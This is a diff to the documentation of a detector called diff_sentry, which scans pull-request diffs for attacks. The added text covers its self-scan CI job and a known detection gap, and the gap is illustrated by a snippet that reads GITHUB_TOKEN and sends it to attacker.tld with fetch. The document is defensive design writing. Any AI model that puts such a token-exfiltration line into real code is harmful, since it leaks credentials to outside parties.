@@ -115,8 +115,30 @@ export loop, fully offline-testable. The planner/analyst can now run on a **Clau
 (`claude-agent-sdk/<model>`, the opt-in `subscription` extra); the classifier stays on its own
 OpenAI-compatible endpoint by design. Host-side GitHub ingestion and the SIEM emitter ship as real, injectable
 seams (unit-tested with fakes); wiring them to a live GitHub/SIEM and adding the cheap pre-filter tier are the
-next increments. CI gates the offline suite + ruff on every push/PR (`.github/workflows/ci.yml`). A further
-tracked increment: a self-review workflow that dogfoods the detector on this repo's own incoming PRs/issues —
-structurally safe because the change is ingested as *data* (never checked out, never executed) and a skewed
-verdict cannot suppress the evidence union; advisory comment only, never a required merge check. Built on
-`rlm-kit` with **zero** changes to the kit — a consumer extends, it doesn't fork.
+next increments. CI gates the offline suite + ruff on every push/PR (`.github/workflows/ci.yml`).
+
+**Dogfooding, half shipped.** The deterministic half now runs on this repo's own changes: the `self-scan`
+job pipes the PR's diff through `python -m diff_sentry scan` and fails on a hit at/above the signal floor.
+It uses the `scan` subcommand rather than the full pipeline on purpose — `scan` needs no creds, so it runs
+under the read-only token a fork PR already gets, whereas handing creds to a fork PR run would require
+`pull_request_target`, the very misconfiguration that opened the AsyncAPI "Miasma" compromise. Because this
+is a *detector* repo, the rule bodies / planner prompt / attack skills / fixtures / eval taskset and the docs
+that tabulate them carry attack patterns as their job, so they are scanned in a report-only step while the
+machinery and the build/CI/dependency surface are gated. Still pending: the live half — an advisory
+self-review that classifies incoming PRs/issues with the model, structurally safe because the change is
+ingested as *data* (never checked out, never executed) and a skewed verdict cannot suppress the evidence
+union; advisory comment only, never a required merge check, and gated behind `workflow_dispatch`/`schedule`
+with a `github.repository` owner guard so forks never fire it.
+
+**Known, accepted gap in the deterministic layer.** A secret read that reaches a JavaScript network sink
+*across lines* (`const t = process.env.GITHUB_TOKEN;` … `fetch('https://attacker.tld', {body: t})`) does not
+fire: `data-exfiltration` requires the secret name and the sink within 80 characters on ONE line, so a
+newline defeats it. The evaluated fix — lightweight taint tracking from the `process.env` assignment to the
+sink call site, suppressed when the target host is first-party — measured zero false positives across the
+corpus benigns and this repo's full history, but it still cannot separate "exfiltrates a token" from
+"legitimately posts to a third-party SaaS", so it is deliberately not shipped rather than shipped noisy.
+This shape currently relies on the planner's judgement; note the deterministic `pwn-request` rule does NOT
+cover it, since that fires when a privileged workflow is *introduced*, not when a pre-existing one is
+*exploited*.
+
+Built on `rlm-kit` with **zero** changes to the kit — a consumer extends, it doesn't fork.
